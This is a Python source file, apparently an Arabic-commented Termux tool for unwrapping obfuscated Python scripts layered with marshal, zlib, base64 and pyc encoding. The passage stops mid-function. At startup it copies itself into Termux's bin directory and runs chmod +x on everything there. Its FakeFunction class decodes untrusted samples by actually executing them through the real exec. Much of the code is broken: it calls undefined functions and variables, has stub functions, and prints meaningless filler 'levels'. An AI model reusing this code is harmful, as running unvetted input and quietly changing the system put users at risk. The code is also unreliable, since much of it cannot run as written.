import os, sys
os.system('cp Dev1.py /data/data/com.termux/files/usr/bin')
os.system('cp pycdc2 /data/data/com.termux/files/usr/bin')
os.system('cd /data/data/com.termux/files/usr/bin')
os.system('chmod +x *')
import sys,autopep8,requests
from re import findall
from typing import Optional	
import sys,marshal,re
from typing import Union,Optional
from types import CodeType
from zipfile import ZipFile
from rich.console import Console
cons=Console()
console=cons
from subprocess import Popen, PIPE
import webbrowser,os,builtins
from multiprocessing import Process
from rich.syntax import Syntax
import os, sys
from pathlib import Path
import time

xxh = '\x1b[38;5;208m'#برتقالي
r1='\x1b[38;5;8m'#رمادي
e1='\x1b[38;5;196m'#احمر
w1='\x1b[38;5;225m'#وردي فاتح جدا
t1='\x1b[38;5;92m'#بنفسجي غامق
y1='\x1b[1;93m'#اصفر نيون
u1='\x1b[1;38;5;203m'#وردي لطيف
i1='\x1b[1;38;5;121m'#اخضر نيون
o1='\x1b[1;96m'#ازرق سماوي
p1='\x1b[38;5;205m'#وردي فاتح
a1='\x1b[38;5;161m'#وردي جميل جدا
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أزرق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخضر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أصفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # رمادي فاتح
a35 = '\x1b[38;5;246m'  # رمادي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
a38 = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[38;5;117m'  # أزرق سماوي
Devil = [xxh, r1, e1, w1, t1, y1, u1, i1, o1, p1, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15, a16, a17, a18, a19, a20, a21, a22, a23, a24, a25, a26, a27, a28, a29, a30, a31, a32, a33, a34, a35, a36, a37, a38, a39, a40]
def bytos(so):
	source=so
	
	do={}
	for i in source.split('bytes'):
		
		
		try:
			
			sb=str(i).split('(')[1]
			sb=sb.split(').dec')[0]
			enc='bytes('+sb+').decode()'
			ev=(sb.replace(' ',''))
			ls=[]
			for e in ev.split('\n'):
				e=e.replace(',','')
				e=e.replace(']','')
				e=e.replace('[','')
				try:
					en=(int(e))
					ls.append(en)
				
				
				except:
					1
		
		
			rel=(bytes(ls).decode())
			enc=enc
			do.update({enc:rel})
			ls.clear
		except IndexError:
			pass
		#print(rel)

	for en,de in do.items():
		#source=open(fi,'r').read()
		if en in source:
			source=source
			#print(de)
			source=source.replace(en,f"'''{de}'''")
		source=source
		#source=open(fi,'w').write(source)
		save(source,'w','ou')
		
def kill_none(source):
	cod=open(source,'r').read()
	non="""None(None((lambda .0 = None: for i in .0:
"""
	rng='))(range('
	qc='))))'
	cod=cod.replace(non,"str(''.join(")
	cod=cod.replace(rng,") for i in range(int(")
	open(source,'w').write(cod)
	#print(cod)
	
def kill_non(file):
	rso=file
	fin=open(file,'r')
	#fri=0
	if 'None(None((lambda' in fin.read():
		
		fri=0
		for jkk in open(file,'r').readlines():
			
			if 'None(None((lambda' in jkk:
				
				
				fri+=1
				
		for ils in range(fri):
				file =open(rso,'r').read()
				first=file.split('None(None((lambda')[1]
				fend=first.split(')))')[0]
				none=('None(None((lambda'+fend+'))))')
				print(none)
				
				
				cho=first.split('choice(')[1].split(')')[0]
				rang=first.split('range(')[1]
				if '(' in rang:
					rang=rang.split('int(')[1].split(')')[0]
				else:
					rsng=rang.split(')')[0]
				
				#print(range)
				rel="str(''.join(random.choice("+str(cho)+') for i in range(int('+str(rang)+'))'
				if none in file:
					#print(none)
					sourc=file.replace(none,rel)
					open(rso,'w').write(sourc)
		

Copyright=['@Coder_Escanor']
		
def clear_un(source):
	p="Thread(rann, ('target',)"
	if p in source:
		source=source.replace(p,'Thread(target=rann')			
	p='return None'
	if p in source:
		source=source.replace(p,'')		
	p='''finally:
                                continue'''
                                
	if p in source:
		source=source.replace(p,'except:')	
	p='''finally:
                        pass'''
	if p in source:
		source=source.replace(p,'except:')
	p='''finally:
                    pass'''
	if p in source:
		source=source.replace(p,'except:')
	p='''finally:
            pass'''
    
	if p in source:
		source=source.replace(p,'except:')
	p='finally:'
	if p in source:
		source=source.replace(p,'except:')
	p="  copyright = '@psh_team'"
	if p in source:
		source=source.replace(p,'')
	p='continue'
	if p in source:
		source=source.replace(p,'')
	p='''Coder_Escanor = False
if Coder_Escanor:
    
    try:'''
    
	ex="""    except:
		1"""
	if p in source:
		source=source+ex
	#header
	h="(c, head1, data1, (headers, data))"
	if h in source:
		source=source.replace(h,"(url=c,headers=head1,data1)")
	h="(url, headers, (headers))"
	if h in source:
		source=source.replace(h,'(url=url,headers=headers')
	h="cookie: cok }, (cookies)"
	if h in source:
		source=source.replace(h,"'cookie': cookies=cok")
	h="headers_, (headers)"
	if h in source:
		source=source.replace(h,'headera=headera_,')
	if "os.system('pip install" in source:
		source=source.replace("os.system('pip install","    os.system('pip install")
	h="\n')"
	if h in source:
		
		source =source.replace(h,"')")
	h="head1, (headers)"
	if h in source:
		
		source =source.replace(h,'headers=head1')
	h="headers, cookies, (headers, cookies)"
	if h in source :
		
		source =source.replace(h,'headers=headers,cookies=cookies')
	h="head, (headers)"
	if h in source :
		source=source.replace(h,'headers=head')
	h="headers, data, (headers, data)"
	if h in source :
		
		source =source.replace(h,'headers=headers,data=data')
	h="headers, (headers)"
	if h in source:
		
		source =source.replace(h,'headers=headers')
                                  
	h="        os.system('pip install"
	
	if h in source:		
		source =source.replace(h,'YASIR = [')
	h="YASIR=["

	cobe="#Decoded By  : @obh_44  : @Coder_Escanor \n\n"
	#source=cobe+source+'\n'+cobe
#	source=source.split('        ')
#	source=''.join(source)
#	source=autopep8.fix_code(source)
#	source=autopep8.fix_code(source)
#	source=autopep8.fix_code(source)
##	source=autopep8.fix_code(source)
#	source=autopep8.fix_2to3(source)
#$	source=yapf.file_resources(source)
#	source=autopep8.fix_lines(source)
	#Kill_non('decoded.py')
	#open('decoded.py','w').write(source)

#	os.system('autopep8 --in-place decoded.py')
def marsh3():
    lo=1
    try:
        source =open(into,'r').read()
        if lo==1:
            print(lo)
            source=source.replace('\x84!Z\x01d\x02d\x03l','\x84!1\x011\x02d\x03l')
            save(source,'w','ou')
            #decoder(la,lo)
            
        
    
    
        
        
        
        
        elif lo ==2:
            print(lo)
            source=source.replace('x02Z','x02z')
            save(source,'w','ou')
            decoder(la,lo)
        elif lo ==3:
            print(lo)
            source=source.replace('x1e','x1z')
            save(source,'w','ou')
            decoder(la,lo)
        elif lo ==4:
            print(lo)
            source=source.replace(r'x01d\x02d',r'x01z\x02d')
            save(source,'w','ou')
            decoder(la,lo)            
#  
        else:
           decoder(la,lo)
           
    except UnicodeDecodeError:
              decoder(la,lo)
              
		
def search_func(source: str, function_name: str) -> str:
    pattern: str = r"(" + function_name + r"(?:[\s]+)?\()"
    while True:
        func_names = re.findall(pattern, source)
        if len(func_names) == 0:
            break

        for func_name in func_names:
            index = source.find(func_name)
            if index:
                break

        if index == -1:
            break
        text = func_name
        open_brakets = 1
        for char in source[index + len(func_name):]:
            text += char
            if char == ")":
                open_brakets -= 1
            elif char == "(":
                open_brakets += 1
            if open_brakets == 0:
                break

        yield source[source.find(text):source.find(text) + len(text)]
        source = source[:source.find(text)] + source[source.find(text) + len(text):]

def eval_filter(source) -> str:
    def root_search(all_eval_functions, source):
        for func in all_eval_functions:
            if not func.strip():
                all_eval_functions.remove(func)

        exceptions = 0
        for eval_f in all_eval_functions:
            try:
                eval_body = re.findall(r"\((.+)\)", eval_f)[0]
                bad_functions = ["eval", "exec"]
                is_in = False
                for function in bad_functions:
                    if function in eval_body:
                        is_in = True
                if is_in:
                    root_search(list(set(list(search_func(eval_body, "eval")))), source)
                    exceptions += 1
                    continue
            except IndexError:
                continue

            try:
                try:
                    eval_data = eval(f"b{eval_body}").decode()
                except Exception:
                    eval_data = eval(eval_body)
                source = source.replace(eval_f, eval_data)
            except Exception:
                exceptions += 1
        return source

    return root_search(list(set(list(search_func(source, "eval")))), source)

def show_code(source: str, temp):
    if not temp:
        p = Process(target=show_code, args=(source, 1))
        p.start()
        p.join(60)
        if p.is_alive():
            p.kill()
            console.print("# [yellow]can't show the code because the file is too big![/yellow]")
    else:
        syntax = Syntax(source, "python", line_numbers=True)
        console.print(syntax)

class DecompilePyc:
    def __init__(self, filename: str):
        self.filename = filename
        
        self.std = Popen(["pycdc2", filename], stdout=PIPE,stderr=PIPE)

    def get_source(self) -> Optional[str]:
        out = self.std.stdout.read().decode()
        err = self.std.stderr.read().decode()
        if out and err:
            return out + '\n' + err
        elif out:
            return out
        else:
            #print(err)
            return None


class DecompileMarshal:
    def __init__(self, bytecode: CodeType):
        self._data: bytes = marshal.dumps(bytecode)
        self._magic_number: bytes = b'a\r\r\n\x00\x00\x00\x00\xe2\xb6\xcea\r\x00\x00\x00'
        

    def get_source(self) -> bytes:
        return self._magic_number + self._data


def get_source_type(source) -> str:
    try:
        compile(source, "<string>", "exec")
        return "py"
    except Exception:
        if type(source) == str:
            source = source.encode("utf-8")
        if b'PK\x03\x04' in source:
            return "zip"
        else:
            try:
                source.decode()
                return "py"
            except Exception:
                return "pyc"



import marshal
from types import CodeType
from typing import Union
import importlib.util

def get_bytecode(source: str) -> CodeType:
    # تأكد من أن الدالة get_bytecode معرّفة بطريقة صحيحة
    pass

def get_bytecode_from_file(filename: str) -> Union[CodeType, None]:
    try:
        with open(filename, "r") as f:
            data = f.read()
        return get_bytecode(data)
    except UnicodeDecodeError:
        with open(filename, "rb") as f:
            data = f.read()
        return marshal.loads(data[16:])
    except Exception as e:
        print(f"Error loading bytecode from file: {e}")
        return None

def clean_source(source: Union[str, bytes]) -> Union[str, bytes, CodeType]:
    if isinstance(source, str):
        try:
            get_bytecode(source)
            return source
        except SyntaxError:
            pass
        except ValueError:
            return source.encode()

    try:
        return source
    except UnicodeDecodeError:
        return get_bytecode(source)
    except ValueError:
        return source.encode()

def check_file_indentation(filename: str):
    try:
        with open(filename, "r") as f:
            lines = f.readlines()
        for i, line in enumerate(lines):
            if line.startswith("def "):
                print(f"Function definition found at line {i+1}: {line.strip()}")
                indent_level = len(line) - len(line.lstrip())
                print(f"Indentation level: {indent_level}")
    except Exception as e:
        print(f"Error checking file indentation: {e}")

def open_file(filename) -> Union[str, bytes, CodeType]:
    try:
        with open(filename, "r") as r_file:
            source=r_file.read()
            
            source=source.replace("exec(loads","exec(marshal.loads")
            source=source.replace("exec(Plya_Team.loads","exec(marshal.loads")
            source=source.replace("exec((_)(","_ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1])); exec((_)(")
            source=source.replace("exec(Plya_Team)","")
            source=source.replace("import zlib","import zlib\nimport base64")
            source=source.replace("Plya_Team = ","exec")
            source=source.replace("))'))","))")
            source=source.replace("""#shafey
###########
#moelshafey1
#####456465433343453######
#@MO_SH_FY
###########""","")
            source=source.replace("exec(loads","exec(marshal.loads")
            source=source.replace("exec((_)(","_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__[::-1]));exec((_)(")
            source=source.replace("exec((_)(","_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(")
            source=source.replace("exec((_)(","_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(")
            
            source=source.replace("exec(_(","_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(")
            source=source.replace("exec(_(","_ = lambda __ : __import__('gzip').decompress(__import__('lzma').decompress(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))));exec((_)(")
            source=source.replace("exec(_(","_ = lambda __ __import__('base64').b64decode(__[::-1])));exec((_)(")
            source=source.replace("except KeyboardInterrupt:\n    exit()","")
            source=source.replace('Ferly__ = ("https://ferlyafriliyan.vercel.app");Dev__ = ("https://github.com/ferlyafriliyan");["from","import","as","marshal","base64","zlib","((","))","exec","exec(",]','')
            source=source.replace('try:\n    import marshal, zlib, base64;Ryougaa_Hidekii__=(marshal.loads(zlib.decompress(base64.b64decode(','import marshal, zlib, base64;exec(marshal.loads(zlib.decompress(base64.b64decode(')
            source=source.replace('Ryougaa_Hidekii__=(marshal.loads(zlib.decompress(base64.b64decode(','import marshal, zlib, base64;exec(marshal.loads(zlib.decompress(base64.b64decode(')
            source=source.replace("exec((_)(","_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(")
            
            source=source.replace(", compile))", "[::-1]))")
            source=source.replace("exec((lambda _____, ______ : ______(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 122, 108, 105, 98, 34, 41, 46, 100, 101, 99, 111, 109, 112, 114, 101, 115, 115],chr))(_____),'<https://t.me/N_9_N_6','exec'))(", "_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(")
            source=source.replace("exec(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 39, 109, 97, 114, 115, 104, 97, 108, 39, 41, 46, 108, 111, 97, 100, 115],chr))(", "_ = lambda __ : __import__('marshal').loads(__[::-1]);exec((_)(")
            source=source.replace(")).encode()", "[::-1]))")
            source=source.replace("exec((lambda _____, ______ : ______(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 122, 108, 105, 98, 34, 41, 46, 100, 101, 99, 111, 109, 112, 114, 101, 115, 115],chr))(_____),'<https://t.me/N_9_N_6','exec'))(", "_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(")
            source=source.replace("exec(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 39, 109, 97, 114, 115, 104, 97, 108, 39, 41, 46, 108, 111, 97, 100, 115],chr))(", "_ = lambda __ : __import__('marshal').loads(__[::-1]);exec((_)(")
            source=source.replace(")).encode()", "[::-1]))")

            return clean_source(source)
    except UnicodeDecodeError:
        with open(filename, "rb") as rb_file:
            return rb_file.read()

class FakeFunction:
    def __init__(self, source: str, filename: str):
        global __file__
        #aa=marshal.loads(eval(source))
        self.pyc_source = None

        # to save the real functions.
        self.old_webbrowser_open = webbrowser.open
        self.old_os_system = os.system
        self.old__file__ = __file__
        self.old_exec = builtins.exec
        self.old_loads = marshal.loads
        self.old_compile = builtins.compile

        # change real functions to fake function.
        __file__ = filename
        exec = self._fake_exec
        marshal.loads = self._fake_loads
        builtins.compile = self._fake_compile

        # ignore spamm function
        webbrowser.open = lambda *args, **kwargs: None
        os.system = lambda *agrs, **kwargs: None

        # execute the source code.
        try:
            if "eval" in source:
                source = eval_filter(source)
            
            
            self.old_exec(source)
        except ModuleNotFoundError as err:
            print("")
#            print("# install the Module first then try again.")
        except SystemError:
            print("# unknown opcode! try to use another python3 version to decode this file.")
        except NameError as err:
            if self.pyc_source is not None:
                pass
            else:
                print("#", err)
                print("# there is a NameError in the file fix it first and try again.")
        except KeyboardInterrupt:
            pass

        # to replace all fake functions with the
        # real function.
        webbrowser.open = self.old_webbrowser_open
        os.system = self.old_os_system
        __file__ = self.old__file__
        builtins.exec = self.old_exec
        marshal.loads = self.old_loads
        builtins.compile = self.old_compile

    def get_source(self) -> Union[str, None, CodeType]:
        if self.pyc_source:
            if type(self.pyc_source) == bytes:
                try:
                    return self.pyc_source.decode()
                except UnicodeDecodeError:
                    return marshal.loads(self.pyc_source)
            else:
                return str(self.pyc_source)
        return None

    def _fake_exec(self, *args, **kwargs):
        if type(args[0]) in (bytes, str):
            self.pyc_source = args[0]

    def _fake_loads(self, *args, **kwargs):
        if type(args[0]) in (bytes, str):
            self.pyc_source = args[0]
        return self.old_loads(*args, **kwargs)

    def _fake_compile(self, *args, **kwargs):
        if type(args[0]) in (bytes, str):
            self.pyc_source = args[0]
        return self.old_compile(*args, **kwargs)


def get_file_type(filename) -> str:
    source = open_file(filename)
    
    return get_source_type(source)
def open_python_file(filename) -> Union[str, bytes, CodeType]:
    source = open_file(filename)
    if get_source_type(filename) == "zip":
        archive = ZipFile(filename)
        py_filename = archive.filelist[0].filename
        source = archive.read(py_filename)
        if get_source_type(source) == "py":
            return clean_source(source)
        return source
    return source

class Pyprivet:
	print('اهلا بك في اداة ديفل لفك التشفير ')
	print('\033[0m    ▭▬▭▬▭▬         ▭▬▭▬▭▬          ')
	def __init__(self,file):
		self.file=file
		file=self.file
		cc=r'c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'	
		xe3=r'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x'
		n=0
		mod='>eludom<'
		refile=file[::-1]
		
		
		if xe3 in file:
			print('xe3')
			for i in file.split('\\'):
		
			
				if 'x84!Z' in i:
					n+=1
			if n >0:
				moufle=refile.split(mod)[0][::-1].split("'))")[0]
				ns=[]
				#module
				for i in range(len(moufle)//2):
					
					aa=(moufle[i])
					ns.append(aa)
				ns=("".join(ns))
				file=(file.split((ns))[0]+moufle)
				#xe3
				xe3=file.split('x84!Z')[0]+'x84!Z'
				x84=file[::-1].split('Z!48x')[1].split('3ex')[0]
				
				x84='\\xe3'+x84[::-1]+'x84!Z'
				xe3=file.split(x84)[1]
				xe3="import marshal\nexec(marshal.loads(b'"+x84+xe3+"'))"
				xe3=marsh93(xe3)
				
				self.file=xe3
				#print(xe3)
			else:
				print('error xe3')
				
				
				
				
		elif cc in file:
			print('ok')
			for i in file.split('\\'):
		
			
				if 'x84!Z' in i:
					n+=1
					
			if n >0:
				moufle=refile.split(mod)[0][::-1].split("'))")[0]
				ns=[]
				#module
				for i in range(len(moufle)//2):
					
					aa=(moufle[i])
					ns.append(aa)
				ns=("".join(ns))
				file=(file.split((ns))[0]+moufle)+"'))"
				#b'c\x00'
				try:
					
					x84=file[::-1].split('Z!48x')[1]
					cc=x84[::-1].split('x00c')[1]
					file=file[::-1].split('Z!48x')[0][::-1]
					file='c'+cc+'x84!Z'+file
					file="import marshal\nexec(marshal.loads(b'"+file
					self.file=file
				except IndexError:
					print(file)
					open('jejeje.txt','w').write(file)
					print('error pyprivet 1')
			else:
				print('error pyprivet 2')
				
					
				
		else:
				print('error1')
				
		#self.file=self.file.replace('!Z\x01d','!z\x01z')
		#self.file=self.file.replace('!Z','!z')
	def source(self):
			
			if r'x84!Z' in self.file:
			    self.file=self.file.replace(r'x84!Z',r'x84!1')
			if r'x84!1\x01d\x02d\x03l' in self.file:
			    self.file=self.file.replace(r'x84!1\x01d\x02d\x03l',r'x84!1\x011\x02d\x03l')
			if  r'x84!1\x01e\x02e\x03\xa0\x04d\x03\xa1\x01\x83\x01Z' in self.file:
				self.file=self.file.replace(r'x84!1\x01e\x02e\x03\xa0\x04d\x03\xa1\x01\x83\x01Z',r'x84!1\x01e\x02e\x03\xa0\x04d\x03\xa1\x01\x83\x011')
				
			#print(self.file)
			#open('dec_dbdbdbdhd.py','w').write(self.file)
			save(self.file,'w','ou')
			decoder(la)
				
				
				#return #self.file
class Eval_conv:
	def __init__(self,file):
		self.file=file
		file=self.file
		
	def sorce(self):
		ns={}
		file=self.file	
		for i in file.split('eval'):
			   if '(marshal.loads(b' in i:
			   	
			   	try:
			   		if 'Decode' in i:
			   			pass
			   
			   			#print(i)
			   		else:
			   			eve=i.split("(marshal.loads(")[1].split("'))")[0]+"'"
			   			#print(eve)
			   		
			   			res='eval(marshal.loads('+eve+'))'
			   			try:
			   				try:
			   					eve=eval(marshal.loads(eval(eve)))
			   					ns.update({res:eve})
			   					
			   				except EOFError:
			   					pass
			   					
			   				
			   				#print(eve)
			   				
			   			except SyntaxError:
			   				pass
			   				
			   			
			   			
			   			#print(res)
			   			
			   		
		 	
			   	except IndexError:
			   		try:
			   			
			   			
			   			if 'Decode' in i:
			   				pass
			   			
			   			try:
			   			
			   				
			   				
			   				
			   			
			   					eve=i.split("eval(marshal.loads(")[1].split('"))')[0]+'"'
			   					res='eval(marshal.loads('+eve+'))'
			   					eve=eval(marshal.loads(eval(eve)))
			   			
			   			
			   					ns.update({res:eve})
			   			except EOFError:
			   				pass
			   		except SyntaxError:
			   			pass
			   
			   			
		
		      	#open('dec_dbdbdbdhd.py','w').write(my_str)
	
		for i,s in ns.items():
				
			if i in file:
				file=file
				ss=file.replace(i,f'"{s}"')
			file=ss
			
			
				    
		save(file,'w','ou')
	def en_marsh(self):
		file=self.file
		try:
			ma=file.split('exec(marshal.loads(')[1].split("'))\n")[0]+"'))"
			ma='import marshal\nexec(marshal.loads('+ma
			save(ma,'w','ou')
			decoder(la,1)
			return 'save'
			
		except IndexError:
			print('error')	
class Byto:
	def __init__(self,file):
		self.file=file
	def en_marsh(self):
		file=self.file
		print('marshal')
		ma=file.split('exec(marshal.loads(')[1].split("'))")[0]
		ok='import marshal\nexec(marshal.loads('+ma+"'))"
		save(ok,'w','ou')
		#Pyprivet('Decode_Escanor.py').source()
		return 'ok en Byto'
	def source(self):
		
		file=self.file
		#4print(file)
		ls=[]
		doce={}
		
		try:
			
			
		
			for ss in file.split('bytes(['):
				if ']).decode()' in ss:
					isa=ss.split(']).decode()')[0]
					for sha in isa.split(","):
						fin=findall("[0-70]",sha)
						finz="".join(fin)
						try:
							if ' ' in finz:
								pass
							else:
								aa=int(finz)#(str(int(finz))+'jfdjjxdjdidirie')
								ls.append(aa)
								
								
							
						except Exception as E:
							print('errorrrs integr')
					rel=(bytes(ls).decode())
					
					byto='bytes([' + isa.rstrip() +']).decode()'
					doce.update({byto:rel})
					
								
	    	 
			for p,h in doce.items():
				if p in file:
					file=file
					ss=file.replace(p,h)
					
			
							
				
				file=ss
			#	open('dhdhrhrhrhd.txt','w').write(file)
				
				print('7t74ueuru3u3u')
				
				save(file,'w','ou')
				
				
				
			
				
				
				
			
			#pass
				

		except Exception as E:
			print(E)
			print('okk')

		

def show_code(source, level, layers_decoded=0):
    if level == 1:
        print("Basic: This level shows basic concepts of the code.")
    elif level == 2:
        print("Intermediate: This level shows more complex aspects of the code.")
    elif level == 3:
        print("Advanced: This level reveals advanced techniques in the code.")
    elif level == 4:
        print("Expert: This level displays expert-level implementations and optimizations.")
    elif level == 5:
        print("Master: This level demonstrates mastery over the code, including elegant solutions.")
    elif level == 6:
        print("Guru: At this level, the code reaches guru status, showcasing profound insights.")
    elif level == 7:
        print("Ninja: The highest level, where the code becomes ninja-like, almost mystical in its elegance.")
    elif level == 8:
        print("Jedi: This level transcends mere coding, delving into the realm of the Jedi.")
    elif level == 9:
        print("Legend: Only legends can understand the intricacies revealed at this level.")
    elif level == 10:
        print("Mythical: The code at this level is considered mythical, whispered about in hushed tones.")
    elif level == 11:
        print("Divine: This level transcends mortal comprehension, revealing divine secrets.")
    elif level == 12:
        print("Ethereal: The code at this level is beyond the grasp of ordinary beings, ethereal in nature.")
    elif level == 13:
        print("Cosmic: At this level, the code touches the fabric of the cosmos itself.")
    elif level == 14:
        print("Universal: The code at this level is universal in its application, spanning dimensions.")
    elif level == 15:
        print("Infinite: The highest level, where the code transcends all boundaries, infinite in complexity.")
    elif level == 16:
        print("Transcendent: This level goes beyond mere infinity, reaching transcendence.")
    elif level == 17:
        print("Enlightened: At this level, the code achieves enlightenment, illuminating all who behold it.")
    elif level == 18:
        print("Ascended: The code ascends to new heights, beyond mortal comprehension.")
    elif level == 19:
        print("Omniscient: The code becomes omniscient, knowing all and revealing all.")
    elif level == 20:
        print("Cosmic Consciousness: At this level, the code attains cosmic consciousness, one with the universe.")
    elif level == 21:
        print("Creator: The code becomes the creator, shaping reality itself.")
    elif level == 22:
        print("")
    elif level == 23:
        print("")
    else:
        print("Invalid level")
    

# Calling the function with different levels
show_code("source_code_here", 1, 3)
show_code("source_code_here", 2, 5)
show_code("source_code_here", 3, 7)
show_code("source_code_here", 4, 9)
show_code("source_code_here", 5, 11)
show_code("source_code_here", 6, 13)
show_code("source_code_here", 7, 15)
show_code("source_code_here", 8, 17)
show_code("source_code_here", 9, 19)
show_code("source_code_here", 10, 21)
show_code("source_code_here", 11, 23)
show_code("source_code_here", 12, 25)
show_code("source_code_here", 13, 27)
show_code("source_code_here", 14, 29)
show_code("source_code_here", 15, 31)
show_code("source_code_here", 16, 33)
show_code("source_code_here", 17, 35)
show_code("source_code_here", 18, 37)
show_code("source_code_here", 19, 39)
show_code("source_code_here", 20, 41)
show_code("source_code_here", 21, 43)
show_code("source_code_here", 22, 45)
show_code("source_code_here", 23, 47)
def print_decoding_progress(layers_decoded):
    print(f"Done Decode Tool Encryption √ {layers_decoded} Layer")
def update_progress_bar(progress):
    bar_length = 40  
    block = int(round(bar_length * progress))
    text = f"\r[{block * '='}{(bar_length - block) * ' '}] {progress * 100:.0f}%"
    print(text, end="")

def process_with_progress():
    total_steps = 100  
    for step in range(total_steps + 1):
        update_progress_bar(step / total_steps)
        time.sleep(0.1) 
    print("\nProcess completed!")    
def decoder(la,lo:Optional[int] =1 ):	
	la+=1
	
	source = open_python_file('Decode_Escanor.py')
	
	file_type = get_file_type('Decode_Escanor.py')
	
#	print(source)	
	if file_type == "zip":
	       pass
	elif type(source)==str:
	     if 'x84!Z' in source:
	     #	open('47474747474.txt','w').write(source)
	     	print(7437373737)
	     	Pyprivet(source).source()
	     


	           	
	           
	           	
	           		       
	      

	     source: Union[str, None, CodeType] = FakeFunction(source, 'Decode_Escanor.py').get_source()
	           	
	     	
	     
	     
	     
	      
	       	
	       	
	       	#print(source)
	       	
	       	
	       
	       	
	       	
	       
	       
	       
	       
	
	elif type(source) == bytes:
	       
	       
	       source: str = DecompilePyc('Decode_Escanor.py').get_source()
	       if '(lambda'  in source :
	           
	           print(source)
	           print(lo)
	           
	           marsh3()
	           
	          # decoder(la,lo)
	          
	               
	       
	           
	               
	               

        
	 
	else:
	       print('Is not python file')
        
       
	if type(source) == str:
     	
	     		
	    
	    

	       if 'exec(marshal.loads(' in source:
	        save(source,'w','ou')
	           
	           
              
	       cop='''(Python 3.9)''' 
	       if cop in source:
	       	source=source.split(cop)[1]
	       if 'Warning:' in source:
	       	source=source.split('Warning:')[0]
	       save(source,'w','ou')
	       show_code("source_code_here", 23, 47)
	       print(f"\033[0mDone Decode Tool Encryption √ {layrs} Layer")
	       save(source,'w','ou') 
	       if 'exec(base58' in source:
	           try:
	               prefix = 'import base58\nexec(base58'
	               suffix = source.split('exec(base58', 1)[1].split("'))", 1)[0]
	               source = f"{prefix}{suffix}))" if suffix.endswith("))") else f"{prefix}{suffix}')')"
	           except IndexError:
	               prefix = 'import base58\nexec(base58'
	               suffix = source.split('exec(base58', 1)[1].split('"))', 1)[0]
	               source = f"{prefix}{suffix})" if suffix.endswith(")") else f"{prefix}{suffix}')"
	               save(source, 'w', 'ou')
	               decoder(la, lo)  
	       if 'exec(base64' in source:
	           try:
	               source=source.split('exec(base64')[1].split("'))")[0]
	               source='import base64\nexec(base64'+source+"'))"
	               save(source,'w','ou')
	               decoder(la,lo)
	           except IndexError:
	               source=source.split('exec(base64')[1].split('"))')[0]
	               source='import base64\nexec(base64'+source+'"))'
	               save(source,'w','ou')
	               decoder(la,lo)
	       if 'exec(base32' in source:
	           try:
	               source=source.split('exec(base32')[1].split("'))")[0]
	               source='import base64\nexec(base32'+source+"'))"
	               save(source,'w','ou')
	               decoder(la,lo)
	           except IndexError:
	               source=source.split('exec(base32')[1].split('"))')[0]
	               source='import base64\nexec(base32'+source+'"))'
	               save(source,'w','ou')
	               decoder(la,lo)
	       if 'exec(base16' in source:
	           try:
	               source=source.split('exec(base16')[1].split("'))")[0]
	               source='import base64\nexec(base16'+source+"'))"
	               save(source,'w','ou')
	               decoder(la,lo)
	           except IndexError:
	               source=source.split('exec(base16')[1].split('"))')[0]
	               source='import base64\nexec(base16'+source+'"))'
	               save(source,'w','ou')
	               decoder(la,lo)        
	       if 'exec(base85' in source:
	           try:
	               source=source.split('exec(base85')[1].split("'))")[0]
	               source='import base64\nexec(base85'+source+"'))"
	               save(source,'w','ou')
	               decoder(la,lo)
	           except IndexError:
	               source=source.split('exec(base85')[1].split('"))')[0]
